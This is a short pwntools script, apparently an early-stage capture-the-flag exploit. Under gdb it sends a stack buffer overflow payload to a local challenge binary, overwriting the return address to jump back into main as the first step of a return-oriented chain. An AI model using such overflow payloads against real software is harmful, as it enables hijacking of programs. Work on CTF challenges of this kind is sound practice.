from pwn import *

chal = ELF('./chal_patched')
libc = ELF('../glibc/2.42/libc.so.6')

gdbscript='''
b *0x401270
c
'''

context.binary = chal
context.terminal = ["tmux", "splitw", "-h"]

#conn = process([chal.path])
conn = gdb.debug([chal.path], gdbscript)

def main():
    addr_main = 0x401204
    addr_ret = 0x401270

    payload = b'\0' * 0x20
    payload += p64(0)
    payload += p64(addr_ret)
    payload += p64(addr_main)
    
    conn.sendlineafter(b'Input: ', payload)
    conn.interactive()

if __name__ == '__main__':
    main()
